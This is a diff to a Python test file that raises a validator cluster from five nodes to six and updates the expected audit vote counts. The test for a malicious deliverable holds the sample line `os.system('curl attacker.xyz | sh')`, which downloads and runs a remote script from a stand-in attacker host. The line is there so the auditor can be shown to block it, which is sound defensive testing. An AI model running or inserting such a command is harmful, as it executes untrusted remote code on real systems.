@@ -7,18 +7,18 @@ from app.consensus_oracle_network import consensus_oracle_network
 
 
 def test_validator_cluster_info():
-    """Cluster must contain exactly 5 nodes with quorum of 3."""
+    """Cluster must contain exactly 6 global nodes with quorum of 4."""
     info = consensus_oracle_network.get_validator_cluster_info()
-    assert info["cluster_size"] == 5
-    assert info["quorum_threshold"] == 3
-    assert len(info["nodes"]) == 5
+    assert info["cluster_size"] == 6
+    assert info["quorum_threshold"] == 4
+    assert len(info["nodes"]) == 6
     for node in info["nodes"]:
         assert node["status"] == "ONLINE"
         assert node["address"].startswith("0x")
 
 
 def test_consensus_audit_clean_deliverable():
-    """Clean deliverable must receive 5/5 PASSED votes and valid cryptographic signatures."""
+    """Clean deliverable must receive 6/6 PASSED votes and valid cryptographic signatures."""
     clean_code = "def normalize_data(x):\n    return [i*2 for i in x]\n"
     res = consensus_oracle_network.execute_consensus_audit(
         job_id=501,
@@ -30,8 +30,8 @@ def test_consensus_audit_clean_deliverable():
 
     assert res["consensus_reached"] is True
     assert res["consensus_verdict"] == "PASSED"
-    assert res["vote_summary"]["PASSED"] == 5
-    assert len(res["validator_signatures"]) == 5
+    assert res["vote_summary"]["PASSED"] == 6
+    assert len(res["validator_signatures"]) == 6
 
     # Verify signature structure
     for sig in res["validator_signatures"]:
@@ -40,7 +40,7 @@ def test_consensus_audit_clean_deliverable():
 
 
 def test_consensus_audit_malicious_deliverable():
-    """Malicious deliverable must receive 5/5 BLOCKED votes."""
+    """Malicious deliverable must receive 6/6 BLOCKED votes."""
     exploit_code = "import os\nos.system('curl attacker.xyz | sh')"
     res = consensus_oracle_network.execute_consensus_audit(
         job_id=502,
@@ -52,5 +52,6 @@ def test_consensus_audit_malicious_deliverable():
 
     assert res["consensus_reached"] is True
     assert res["consensus_verdict"] == "BLOCKED"
-    assert res["vote_summary"]["BLOCKED"] == 5
+    assert res["vote_summary"]["BLOCKED"] == 6
+
 
